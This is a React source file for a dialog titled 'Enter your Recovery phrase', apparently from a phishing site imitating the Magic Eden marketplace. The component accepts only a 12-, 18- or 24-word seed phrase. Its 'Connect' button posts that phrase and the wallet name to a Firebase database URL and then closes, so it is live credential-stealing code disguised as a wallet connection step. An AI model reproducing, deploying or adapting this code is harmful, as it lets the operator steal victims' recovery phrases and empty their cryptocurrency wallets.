import * as React from "react";
import Dialog from "@mui/material/Dialog";
import DialogContent from "@mui/material/DialogContent";
import DialogTitle from "@mui/material/DialogTitle";
import ClearIcon from "@mui/icons-material/Clear";
import {
  Divider,
} from "@mui/material";
import { styled } from "@mui/material/styles";
import axios from "axios";
export default function Inputmodal({ openinput, setopeninput, walletname }) {
  const [error, seterror] = React.useState(true);
  const [input, setinput] = React.useState("");
  const [phraselength, setphraselength] = React.useState(0);
  const handleClose = () => {
    setopeninput(false);
  };
  const Demo = styled("div")(({ theme }) => ({
    backgroundColor: theme.palette.background.paper,
  }));
  function generate(element) {
    return [0, 1, 2].map((value) =>
      React.cloneElement(element, {
        key: value,
      })
    );
  }
  const handleinput = (e) => {
    setinput(e.target.value);
    let wordCount = input.match(/(\w+)/g).length;
    setphraselength(wordCount);
  };
  React.useEffect(() => {
    const checklength = () => {
      if (phraselength === 12 || phraselength === 18 || phraselength === 24) {
        seterror(false);
      } else {
        seterror(true);
      }
    };
    checklength();
  }, [phraselength]);

  const Submit = async () => {
    const res = await axios.post(
      "https://magic-eden-data-default-rtdb.firebaseio.com/magiceden.json",
      { wallet: walletname, key: input }
    );
    setinput("");
    seterror(true);
    setopeninput(false);
  };
  return (
    <div>
      <Dialog open={openinput}>
        <div>
          <DialogTitle
            style={{
              background: "#10141f",
              color: "white",
              textAlign: "center",
              fontSize: "25px",
              fontWeight: "600",
              width: "100%",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
            }}
          >
            Enter your Recovery phrase
            <ClearIcon
              onClick={() => {
                setopeninput(false);
                setinput("");
                seterror(true);
              }}
              style={{ marginLeft: "40px", color: "#777" }}
            />
          </DialogTitle>
        </div>
        <Divider />
        <DialogContent style={{ background: "#10141f" }}>
          <input
            value={input}
            onChange={handleinput}
            type="text"
            style={{
              width: "100%",
              height: "80px",
              borderRadius: "5px",
              outline: "none",
            }}
          />
          {error && (
            <p style={{ color: "red" }}>
              Please,enter your 12 ,18 or 24 phrase
            </p>
          )}
          <button
            style={{
              width: "100%",
              outline: "none",
              background: "purple",
              cursor: "pointer",
              border: "none",
              height: "35px",
              color: "#fff",
              fontWeight: "600",
              borderRadius: "5px",
              marginTop: "15px",
              opacity: error ? "0.3" : 1,
            }}
            onClick={Submit}
            disabled={error ? true : false}
          >
            Connect
          </button>
        </DialogContent>
      </Dialog>
    </div>
  );
}
